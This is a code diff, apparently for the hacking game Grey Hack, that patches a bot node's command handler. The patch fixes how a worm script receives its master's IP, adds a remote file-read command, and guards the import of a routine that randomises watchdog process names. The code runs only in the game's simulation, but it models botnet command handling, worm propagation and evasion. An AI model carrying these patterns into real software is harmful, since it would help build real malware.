@@ -224,8 +224,11 @@ execute_command = function(cmd)
         if parts.len < 3 then return "ERROR|need master_pub_file and depth"
         // Validate master_pub_file path
         if not safe_path(parts[1]) then return "ERROR|access denied"
-        // FIXED: pass 4th parameter "0" as current depth
-        get_shell.launch("/bin/worm.gs", [parts[1], parts[2], get_shell.host_computer.public_ip, "0"])
+        // FIXED: pass master's IP (from parts[3]) as SOURCE_IP, not slave's own IP
+        // parts: [worm, master_pub_file, depth, master_ip]
+        master_ip = ""
+        if parts.len >= 4 then master_ip = parts[3]
+        get_shell.launch("/bin/worm.gs", [parts[1], parts[2], master_ip, "0"])
         return "WORM_STARTED"
     else if parts[0] == "read" then      // ADDED: read command for logs
         if parts.len < 2 then return "ERROR|missing file"
@@ -236,10 +239,20 @@ execute_command = function(cmd)
         if f then return "FILE|" + f.get_content
         return "ERROR|file not found"
     else if parts[0] == "rotate" then
+        // Try to import watchdog_randomizer with error handling
+        randomizer_loaded = false
         if typeof(rotate_watchdog_names) != "function" then
-            import_code("/scripts/utils/watchdog_randomizer.gs")
+            // Use get_shell.launch to test if file exists first
+            test_file = get_shell.host_computer.File("/scripts/utils/watchdog_randomizer.gs")
+            if test_file != null then
+                import_code("/scripts/utils/watchdog_randomizer.gs")
+                randomizer_loaded = true
+            end if
+        else
+            randomizer_loaded = true
         end if
-        if typeof(rotate_watchdog_names) == "function" then
+        
+        if randomizer_loaded and typeof(rotate_watchdog_names) == "function" then
             rotate_watchdog_names()
             return "ROTATED"
         else
